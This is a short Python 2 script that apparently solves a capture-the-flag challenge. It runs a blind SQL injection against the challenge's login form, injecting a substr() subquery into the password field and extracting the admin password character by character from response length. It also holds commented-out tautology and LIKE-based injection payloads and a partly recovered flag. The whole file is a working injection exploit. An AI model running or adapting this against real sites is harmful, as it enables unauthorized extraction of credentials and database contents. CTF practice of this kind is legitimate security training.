import urllib, urllib2, json

url = 'http://ctfq.sweetduet.info:10080/~q6/'

#ps = "t' or 't' = 't"


tbl='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_'

p="FLAG_KpWa4ji3uZk"
for i in xrange(20):
	found = False
	for c in tbl:
#		q = p + c
#		ps = "' or pass like '" + q + "%' or '"
		ps = "' or substr((SELECT pass FROM user WHERE id='admin'), %d, 1)='%c" % (len(p) + 1, c)
		param={'id':'admin', 'pass':ps}
		req = urllib2.Request('http://ctfq.sweetduet.info:10080/~q6/', urllib.urlencode(param))
		res = urllib2.urlopen(req)
		text = res.read()
		print "try", c
		if len(text) >= 600:
			p += c
			print "ok", p
			found = True
			break
	if not found:
		print "end"
		break
